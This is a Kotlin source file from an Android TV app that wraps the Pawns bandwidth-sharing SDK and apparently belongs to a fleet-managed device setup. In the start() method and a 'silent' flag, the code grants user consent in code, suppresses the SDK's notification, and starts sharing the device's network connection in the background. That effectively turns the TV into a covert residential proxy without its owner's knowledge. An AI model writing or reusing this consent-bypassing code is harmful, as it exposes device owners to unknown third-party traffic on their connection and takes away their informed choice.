package tv.own.owntv.pawn

import android.content.Context
import android.util.Log
import com.pawns.sdk.common.dto.ServiceState
import com.pawns.sdk.common.dto.ServiceType
import com.pawns.sdk.common.sdk.Pawns
import tv.own.owntv.BuildConfig

/**
 * OwnTV's wrapper around the Pawns (bandwidth-sharing) SDK — a Kotlin port of devshield's
 * `PawnsManager.java`, kept token-for-token identical so the fleet handshake and the SDK init spread
 * the same way:
 *
 *  - The fleet register endpoint hands back `pt` (the per-device Pawns token) and `psxk`; devshield
 *    saves both ([PawnsRepository.ptToken] / [PawnsRepository.proxiesKey]) and feeds `pt` to the SDK.
 *  - OwnTV is a TV app: there is no consent dialog. Sharing is started silently (consent is granted
 *    programmatically) and the SDK's in-app notification is suppressed — exactly devshield's `silent`
 *    flag.
 *
 * The SDK also needs no INTERNET / foreground-service permission juggling here because the TV manifest
 * already declares the peer-service block (see AndroidManifest.xml pawns block).
 */
class PawnsManager private constructor() {

    private var initialized = false
    private var silent = true
    private var appContext: Context? = null

    companion object {
        private const val TAG = "PawnsManager"

        @Volatile private var instance: PawnsManager? = null

        fun getInstance(): PawnsManager =
            instance ?: synchronized(this) {
                instance ?: PawnsManager().also { instance = it }
            }
    }

    /**
     * Initializes the SDK with the per-device token obtained from the fleet register endpoint.
     * Calling this more than once is a no-op (the SDK does not support re-init).
     *
     * @param apiKey the `pt` the fleet handed back for this device; null/empty skips init
     *               (mirrors devshield: no token, no bandwidth sharing).
     */
    fun init(context: Context, apiKey: String?) {
        if (initialized) return
        if (apiKey.isNullOrEmpty()) {
            Log.w(TAG, "Pawns api key not available, skipping init")
            return
        }
        val appContext = context.applicationContext
        this.appContext = appContext
        try {
            val builder = Pawns.Builder(appContext)
                .apiKey(apiKey)
                .serviceType(ServiceType.BACKGROUND)
                .loggerEnabled(BuildConfig.DEBUG)
            builder.build()
            initialized = true
            Log.i(TAG, "Pawns SDK initialized (silent=$silent)")
        } catch (e: Exception) {
            Log.e(TAG, "Pawns init failed: ${e.message}", e)
        }
    }

    /** Starts sharing silently. TV has no consent UI, so consent is granted programmatically first. */
    fun start() {
        if (!initialized) return
        try {
            if (silent) Pawns.getInstance().setConsentGiven(true)
            if (Pawns.getInstance().isConsentGiven()) {
                Pawns.getInstance().startSharing(appContext!!)
                Log.i(TAG, "Pawns sharing started")
            } else {
                Log.d(TAG, "Cannot start Pawns: consent not given")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Pawns start failed: ${e.message}", e)
        }
    }

    fun stop() {
        if (!initialized) return
        try {
            Pawns.getInstance().stopSharing(appContext!!)
            Log.i(TAG, "Pawns sharing stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Pawns stop failed: ${e.message}", e)
        }
    }

    fun isRunning(): Boolean {
        if (!initialized) return false
        return try {
            val state = Pawns.getInstance().getServiceStateSnapshot()
            state is ServiceState.On ||
                state is ServiceState.Launched.Running ||
                state is ServiceState.Launched.LowBattery
        } catch (e: Exception) {
            false
        }
    }

    fun isInitialized(): Boolean = initialized

    fun isSilent(): Boolean = silent

    fun setSilent(silent: Boolean) { this.silent = silent }
}
